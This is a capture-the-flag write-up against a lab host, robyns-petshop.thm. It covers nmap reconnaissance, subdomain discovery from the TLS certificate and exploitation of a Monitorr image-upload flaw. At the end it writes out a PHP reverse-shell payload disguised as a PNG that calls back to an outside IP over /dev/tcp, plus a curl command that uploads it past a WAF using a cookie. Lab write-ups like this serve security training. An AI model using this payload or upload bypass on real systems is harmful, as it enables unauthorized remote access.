Nmap scan
```sh
nmap -p- -vv 10.81.103.139        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 08:54 IST
Initiating Ping Scan at 08:54
Scanning 10.81.103.139 [4 ports]
Completed Ping Scan at 08:54, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:54
Completed Parallel DNS resolution of 1 host. at 08:54, 0.02s elapsed
Initiating SYN Stealth Scan at 08:54
Scanning 10.81.103.139 [65535 ports]
Discovered open port 21/tcp on 10.81.103.139
Discovered open port 80/tcp on 10.81.103.139
Discovered open port 443/tcp on 10.81.103.139
Discovered open port 22/tcp on 10.81.103.139
SYN Stealth Scan Timing: About 5.70% done; ETC: 09:03 (0:08:33 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 15.99% done; ETC: 09:00 (0:04:54 remaining)
SYN Stealth Scan Timing: About 29.85% done; ETC: 08:59 (0:03:22 remaining)
SYN Stealth Scan Timing: About 39.21% done; ETC: 08:59 (0:03:00 remaining)
SYN Stealth Scan Timing: About 50.05% done; ETC: 08:59 (0:02:26 remaining)
Stats: 0:02:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 59.14% done; ETC: 08:59 (0:01:55 remaining)
Discovered open port 8000/tcp on 10.81.103.139
SYN Stealth Scan Timing: About 74.99% done; ETC: 08:58 (0:01:05 remaining)
Discovered open port 8096/tcp on 10.81.103.139
Discovered open port 22222/tcp on 10.81.103.139
Completed SYN Stealth Scan at 08:58, 237.79s elapsed (65535 total ports)
Nmap scan report for 10.81.103.139
Host is up, received syn-ack ttl 62 (0.19s latency).
Scanned at 2026-02-12 08:54:31 IST for 238s
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE    REASON
21/tcp    open  ftp        syn-ack ttl 62
22/tcp    open  ssh        syn-ack ttl 62
80/tcp    open  http       syn-ack ttl 62
443/tcp   open  https      syn-ack ttl 62
8000/tcp  open  http-alt   syn-ack ttl 62
8096/tcp  open  unknown    syn-ack ttl 62
22222/tcp open  easyengine syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 238.21 seconds
           Raw packets sent: 131225 (5.774MB) | Rcvd: 166 (7.304KB)
```

```sh
nmap -sC -sV -T4 -Pn -p 21,22,80,443,22222 10.81.103.139
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 08:53 IST
Nmap scan report for 10.81.103.139
Host is up (0.18s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)
80/tcp    open  http     Apache httpd 2.4.29
|_http-title: Did not follow redirect to https://robyns-petshop.thm/
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-title: Robyn&#039;s Pet Shop
| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB
| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
| Not valid before: 2026-02-12T03:18:44
|_Not valid after:  2027-02-12T03:18:44
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
22222/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)
|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)
|_  256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (ED25519)
Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds
```
- The port 21 is open but, at this moment, we can’t do anything with this because we can’t login as an anonymous user.
- Same thing with por 22 and 22222, we don’t have credentials.
- On port 80, 443, 8000 we have a web server running Apache/2.4.29 (Ubuntu), so now we know the OS. Nmap give us a very juicy information from the ssl-certificate. If we want to connect to the server we need to add the server DNS to the hosts file. We have 4 different ones:
![[Pasted image 20260212085637.png]]
- robyns-petshop.thm
- dev.robyns-petshop.thm
- beta.robyns-petshop.thm
- monitorr.robyns-petshop.thm
- You can simply add these dns editing the file /etc/hosts
![[Pasted image 20260212085948.png]]
 we have to check the monitorr subdomain. At the bottom of the page we have monitor settings and the monitorr version. I clicked on monitor settings but I didn’t guess any user and password, I also checked the github repository investigating about Monitorr, so now the only option I had left was searching for a monitorr exploit.
 ![[Pasted image 20260212090125.png]]
![[Pasted image 20260212090253.png]]

let’s use this exploits. The first one is Authorization bypass. Let’s have a look at it:
![[Pasted image 20260212090559.png]]
![[Pasted image 20260212090632.png]]
Let’s have a look at the other exploit:
![[Pasted image 20260212090730.png]]
Browsing to “**_/assets/php/upload.php_**”:
![[Pasted image 20260212090803.png]]
Let’s try the exploit:
![[Pasted image 20260212091224.png]]
![[Pasted image 20260212091239.png]]

This python script doesn’t handle SSL connections. We can add **_verify=False_** to the post and get requests to ignore certificate checks:
![[Pasted image 20260212091627.png]]
![[Pasted image 20260212091647.png]]
It says “A shell script should be uploaded.” according the exploit code, the file should have been uploaded in this path: “**_/assets/data/usrimg_**_”_. oh, nothing uploaded:
![[Pasted image 20260212091838.png]]
check the browser for for cookies. there is a cookie called “**isHuman”: “1”**.
![[Pasted image 20260212091953.png]]

Add this cookie to post and get requests:

![[Pasted image 20260212092254.png]]

This method didnt work so we opt for another.
If you use burp, you realize that there’s a cookie `isHuman=1` which has to be set to work. The idea is to upload a php reverse shell, bypassing the WAF by typing .pHp instead of .php, using the image upload functionality and adding the cookie header _isHuman=1_
```sh
echo -e $'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php system("bash -c \'bash -i >& /dev/tcp/192.168.161.2/4444 0>&1\'"); ?>' > shell.png.pHp
```

```sh
curl -k -F "fileToUpload=@./shell.png.pHp" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H "Cookie: isHuman=1"
```
![[Pasted image 20260212094217.png]]
![[Pasted image 20260212094236.png]]

